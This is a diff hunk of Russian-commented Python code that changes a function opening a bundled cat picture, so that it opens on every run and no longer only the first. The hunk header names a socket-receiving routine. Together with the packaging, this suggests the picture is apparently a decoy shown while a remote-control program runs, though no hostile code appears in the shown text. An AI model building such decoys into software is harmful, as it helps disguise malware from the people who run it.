@@ -46,32 +46,17 @@ def reliable_recv(sock):
 
 def open_image():
     try:
-        # Путь к флаг-файлу в TEMP
-        temp_dir = os.environ.get("TEMP", os.getcwd())
-        flag_file = os.path.join(temp_dir, "cutecat_flag.txt")
-
-        # Проверяем наличие флаг-файла
-        if not os.path.exists(flag_file):
-            if hasattr(sys, "_MEIPASS"):
-                image_path = os.path.join(sys._MEIPASS, "cutecat.jpg")
-            else:
-                image_path = os.path.join(os.getcwd(), "cutecat.jpg")
-
-            logging.info(f"[+] Проверяем наличие картинки: {image_path}")
-
-            if os.path.exists(image_path):
-                # Открываем картинку при первом запуске
-                subprocess.Popen(["start", image_path], shell=True)
-                logging.info("[+] Картинка успешно открыта.")
-
-                # Создаём флаг-файл
-                with open(flag_file, "w") as f:
-                    f.write("Картинка уже была открыта")
-            else:
-                logging.error("[!!] Картинка не найдена.")
+        if hasattr(sys, "_MEIPASS"):
+            image_path = os.path.join(sys._MEIPASS, "cutecat.jpg")
         else:
-            logging.info("[+] Картинка уже открывалась ранее. Пропускаем запуск.")
+            image_path = os.path.join(os.getcwd(), "cutecat.jpg")
+        logging.info(f"[+] Проверяем наличие картинки: {image_path}")
 
+        if os.path.exists(image_path):
+            subprocess.Popen(["start", image_path], shell=True)
+            logging.info("[+] Картинка успешно открыта.")
+        else:
+            logging.error("[!!] Картинка не найдена.")
     except Exception as e:
         logging.error(f"[!!] Ошибка при открытии картинки: {e}")
 
